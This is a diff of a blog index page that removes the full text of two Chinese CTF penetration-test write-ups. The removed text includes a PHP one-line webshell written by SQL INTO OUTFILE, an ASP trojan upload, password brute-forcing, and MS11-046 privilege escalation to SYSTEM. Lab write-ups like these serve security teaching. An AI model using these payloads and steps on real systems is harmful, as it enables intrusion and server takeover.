@@ -355,43 +355,14 @@
 
       
         
-          
-            <p>拿到题目，首先御剑扫描，发现后台地址，还有一个<a href="http://www.zip。" target="_blank" rel="noopener">www.zip。</a></p>
-<p><img src="./ptes21.PNG" alt="ptes01"></p>
-<p>疑似源码泄露，下载<a href="http://www.zip。解压发现网站源码，浏览文件发现有一个flag.html。" target="_blank" rel="noopener">www.zip。解压发现网站源码，浏览文件发现有一个flag.html。</a></p>
-<p><img src="./ptes22.PNG" alt="ptes01"></p>
-<p>直接访问页面会跳转，直接文本编辑器代开看源码得到第一个flag。</p>
-<p><img src="./ptes23.PNG" alt="ptes01"></p>
-<p>然后访问后台，用burp爆破密码。发现密码为password。</p>
-<p><img src="./ptes24.PNG" alt="ptes01"></p>
-<p>利用密码登陆后台，发现第二个flag。</p>
-<p><img src="./ptes25.PNG" alt="ptes01"></p>
-<p>查看后台，发现在网站配置里面有上传文件设置，还允许上传asp文件</p>
-<p><img src="./ptes26.PNG" alt="ptes01"></p>
-<p>那就上传asp木马。如图</p>
-<p><img src="./ptes27.PNG" alt="ptes02"></p>
-<p>同样蚁剑连接，访问系统C盘根目录得到第三个flag。</p>
-<p><img src="./ptes28.PNG" alt="ptes02"></p>
-<p><img src="./ptes29.PNG" alt="ptes02"></p>
-<p>上面拿到webshell之后首先用虚拟终端看一下系统信息以及所拥有的权限。</p>
-<p><img src="./ptes30.PNG" alt="ptes02"></p>
-<p>通过蚁剑的虚拟终端，执行whoami发现仅仅是nt authority\network service权限，因此需要提权。通过systeminfo， netstat -ano等命令查看信息，如下：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">inetsrv</span>&gt; <span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">network</span> <span class="title">service</span></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">inetsrv</span>&gt; <span class="title">systeminfo</span></span></span><br><span class="line"><span class="function">主机名:           <span class="title">HA_WEB2</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> 名称:          <span class="title">Microsoft</span>(<span class="title">R</span>) <span class="title">Windows</span>(<span class="title">R</span>) <span class="title">Server</span> 2003, <span class="title">Enterprise</span> <span class="title">Edition</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> 版本:          5.2.3790 <span class="title">Service</span> <span class="title">Pack</span> 2 <span class="title">Build</span> 3790</span></span><br><span class="line"><span class="function"><span class="title">OS</span> 制造商:        <span class="title">Microsoft</span> <span class="title">Corporation</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> 配置:          独立服务器</span></span><br><span class="line"><span class="function"><span class="title">OS</span> 构件类型:      <span class="title">Uniprocessor</span> <span class="title">Free</span></span></span><br><span class="line"><span class="function">注册的所有人:     <span class="title">Thinkpad</span></span></span><br><span class="line"><span class="function">注册的组织:       </span></span><br><span class="line"><span class="function">产品 <span class="title">ID</span>:          69813-640-9722366-45823</span></span><br><span class="line"><span class="function">初始安装日期:     2016-10-24, 8:57:06</span></span><br><span class="line"><span class="function">系统启动时间:     0 天 2 小时 1 分 5 秒</span></span><br><span class="line"><span class="function">系统制造商:       <span class="title">VMware</span>, <span class="title">Inc</span>.</span></span><br><span class="line"><span class="function">系统型号:         <span class="title">VMware</span> <span class="title">Virtual</span> <span class="title">Platform</span></span></span><br><span class="line"><span class="function">系统类型:         <span class="title">X86</span>-<span class="title">based</span> <span class="title">PC</span></span></span><br><span class="line"><span class="function">处理器:           安装了 1 个处理器。</span></span><br><span class="line"><span class="function">                  [01]: <span class="title">x86</span> <span class="title">Family</span> 6 <span class="title">Model</span> 142 <span class="title">Stepping</span> 11 <span class="title">GenuineIntel</span> ~1992 <span class="title">Mhz</span></span></span><br><span class="line"><span class="function"><span class="title">BIOS</span> 版本:        <span class="title">INTEL</span>  - 6040000</span></span><br><span class="line"><span class="function"><span class="title">Windows</span> 目录:     <span class="title">C</span>:\<span class="title">WINDOWS</span></span></span><br><span class="line"><span class="function">系统目录:         <span class="title">C</span>:\<span class="title">WINDOWS</span>\<span class="title">system32</span></span></span><br><span class="line"><span class="function">启动设备:         \<span class="title">Device</span>\<span class="title">HarddiskVolume1</span></span></span><br><span class="line"><span class="function">系统区域设置:     <span class="title">zh</span>-<span class="title">cn</span>;中文(中国)</span></span><br><span class="line"><span class="function">输入法区域设置:   <span class="title">zh</span>-<span class="title">cn</span>;中文(中国)</span></span><br><span class="line"><span class="function">时区:             (<span class="title">GMT</span>+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span></span><br><span class="line"><span class="function">物理内存总量:     1,023 <span class="title">MB</span></span></span><br><span class="line"><span class="function">可用的物理内存:   773 <span class="title">MB</span></span></span><br><span class="line"><span class="function">页面文件: 最大值: 1,510 <span class="title">MB</span></span></span><br><span class="line"><span class="function">页面文件: 可用:   1,356 <span class="title">MB</span></span></span><br><span class="line"><span class="function">页面文件: 使用中: 154 <span class="title">MB</span></span></span><br><span class="line"><span class="function">页面文件位置:     <span class="title">C</span>:\<span class="title">pagefile.sys</span></span></span><br><span class="line"><span class="function">域:               <span class="title">WORKGROUP</span></span></span><br><span class="line"><span class="function">登录服务器:       暂缺</span></span><br><span class="line"><span class="function">修补程序:         安装了 1 个修补程序。</span></span><br><span class="line"><span class="function">                  [01]: <span class="title">Q147222</span></span></span><br><span class="line"><span class="function">网卡:             暂缺</span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">inetsrv</span>&gt; <span class="title">netstat</span> -<span class="title">ano</span></span></span><br><span class="line"><span class="function"><span class="title">Active</span> <span class="title">Connections</span></span></span><br><span class="line"><span class="function">  <span class="title">Proto</span>  <span class="title">Local</span> <span class="title">Address</span>          <span class="title">Foreign</span> <span class="title">Address</span>        <span class="title">State</span>           <span class="title">PID</span></span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:21             0.0.0.0:0              <span class="title">LISTENING</span>       1256</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:80             0.0.0.0:0              <span class="title">LISTENING</span>       4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:135            0.0.0.0:0              <span class="title">LISTENING</span>       692</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:445            0.0.0.0:0              <span class="title">LISTENING</span>       4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:1025           0.0.0.0:0              <span class="title">LISTENING</span>       436</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:3389           0.0.0.0:0              <span class="title">LISTENING</span>       1752</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    127.0.0.1:43958        0.0.0.0:0              <span class="title">LISTENING</span>       1256</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.1.241:80       192.168.1.1:9032       <span class="title">TIME_WAIT</span>       0</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.1.241:80       192.168.1.1:9034       <span class="title">TIME_WAIT</span>       0</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.1.241:80       192.168.1.1:9035       <span class="title">TIME_WAIT</span>       0</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.1.241:80       192.168.1.1:9043       <span class="title">TIME_WAIT</span>       0</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.1.241:80       192.168.1.1:9045       <span class="title">TIME_WAIT</span>       0</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.1.241:80       192.168.1.1:9046       <span class="title">ESTABLISHED</span>     4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.1.241:139      0.0.0.0:0              <span class="title">LISTENING</span>       4</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    0.0.0.0:445            *:*                                    4</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    0.0.0.0:500            *:*                                    436</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    0.0.0.0:1026           *:*                                    752</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    0.0.0.0:4500           *:*                                    436</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    127.0.0.1:123          *:*                                    780</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    127.0.0.1:1027         *:*                                    780</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    192.168.1.241:123      *:*                                    780</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    192.168.1.241:137      *:*                                    4</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    192.168.1.241:138      *:*                                    4</span></span><br></pre></td></tr></table></figure>
-
-<p>发现开启了3389端口，gihub上面找的ms11-046的exp（包含MS11_46_k8.exe和ms11-046.exe两个程序）。<br>exp地址：<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046</a><br>用蚁剑上传失败，换成中国菜刀上传，上传成功：</p>
-<p><img src="./ptes32.PNG" alt="ptes02"></p>
-<p>先运行MS11_46_k8.exe，可以看到成功创建了一个k8team/k8team的用户：</p>
-<p><img src="./ptes33.PNG" alt="ptes02"></p>
-<p>用远程桌面连接目标服务器。可以使用Windows自带的远程桌面连接，我们使用KALI下的rdesktop命令进行远程连接，如下：</p>
-<p><img src="./ptes37.PNG" alt="ptes02"></p>
-<p>进入执行执行第二个exp程序MS11_46_k8.exe，如下：</p>
-<p><img src="./ptes39.PNG" alt="ptes02"></p>
-<p>然后通过whoami查看，发现已经是system权限。直接使用dir C:\admin.txt /s /b 命令（该命令用于查找C盘下所有对amdin.txt文件）查找admin.txt文件的位置。</p>
-<p><img src="./ptes38.PNG" alt="ptes02"></p>
-<p>然后到相应的位置查看该文件得到flag。</p>
-<p><img src="./ptes40.PNG" alt="ptes02"></p>
-
-          
+          <p>拿到题目，首先御剑扫描，发现后台地址，还有一个<a href="http://www.zip。" target="_blank" rel="noopener">www.zip。</a></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/11/23/ptes2/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -530,47 +501,14 @@
 
       
         
-          
-            <p>题目给出一个网站，内容太多，如何下手？</p>
-<ol>
-<li>查看首页源代码，发现后台链接。</li>
-</ol>
-<p><img src="./ptes01.PNG" alt="ptes01"></p>
-<ol start="2">
-<li>仔细观察页面最下面，发现后台链接。</li>
-</ol>
-<p><img src="./ptes02.PNG" alt="ptes02"></p>
-<ol start="3">
-<li>使用御剑扫描发现后台链接。</li>
-</ol>
-<p><img src="./ptes03.PNG" alt="ptes03"></p>
-<ol start="4">
-<li>访问robots.txt文件，发现后台链接。</li>
-</ol>
-<p><img src="./ptes06.PNG" alt="ptes04"></p>
-<p>访问后台链接页面，发现是EmpireCMS 7.0。</p>
-<p><img src="./ptes04.PNG" alt="ptes05"></p>
-<p>首先尝试弱口令test/123456顺利进入后台。</p>
-<p>浏览页面内容，当点击数据更新处时发现第一个flag。</p>
-<p><img src="./ptes05.PNG" alt="ptes06"></p>
-<p>点击版本更新，发现有《帝国网站管理系统》教程下载，</p>
-<p><img src="./ptes07.PNG" alt="ptes07"></p>
-<p>点击链接中的下载链接下载：</p>
-<p><img src="./ptes08.PNG" alt="ptes08"></p>
-<p>然后查看，发现有执行SQL语句功能。</p>
-<p><img src="./ptes09.PNG" alt="ptes09"></p>
-<p>按照里面的步骤执行SQL语句“select ‘<?php @eval($_POST[cmd])?>‘INTO OUTFILE ‘D:/www/<a href="http://www.php&#39;”。" target="_blank" rel="noopener">www.php&#39;”。</a><br>实际上本题木马已经被其他攻击者上传了。直接使用即可。</p>
-<p><img src="./ptes10.PNG" alt="ptes10"></p>
-<p>此时在服务器生成相应的含有一句话木马对php页面。</p>
-<p><img src="./ptes11.PNG" alt="ptes11"></p>
-<p>使用中国菜刀或者中国蚁剑连接该一句话木马，即可访问系统文件。</p>
-<p><img src="./ptes12.PNG" alt="ptes12"></p>
-<p>浏览C盘根目录下的user.txt文件，得到第二个flag：</p>
-<p><img src="./ptes13.PNG" alt="ptes13"></p>
-<p>同样，浏览C盘根目录下的admin.txt文件，得到第三个flag：</p>
-<p><img src="./ptes14.PNG" alt="ptes14"></p>
-
-          
+          <p>题目给出一个网站，内容太多，如何下手？</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/11/23/ptes1/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
